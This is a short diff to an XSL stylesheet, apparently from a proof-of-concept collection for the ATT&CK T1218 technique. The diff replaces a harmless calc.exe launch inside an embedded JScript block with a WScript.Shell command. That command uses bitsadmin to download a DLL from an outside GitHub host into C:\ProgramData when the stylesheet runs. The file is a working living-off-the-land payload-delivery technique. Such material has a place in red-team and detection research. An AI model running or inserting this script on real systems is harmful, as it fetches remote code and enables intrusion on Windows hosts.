@@ -6,6 +6,6 @@ version="1.0">
 <output method="text"/>
 	<ms:script implements-prefix="user" language="JScript">
 	<![CDATA[
-	var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
+	var r = new ActiveXObject("WScript.Shell").Run("bitsadmin /create ping bitsadmin /addfile ping https://github.com/greycel/pocs/raw/master/T1218_calc.dll C:\ProgramData\ping.dll bitsadmin /RESUME ping bitsadmin /complete ping");
 	]]> </ms:script>
 </stylesheet>
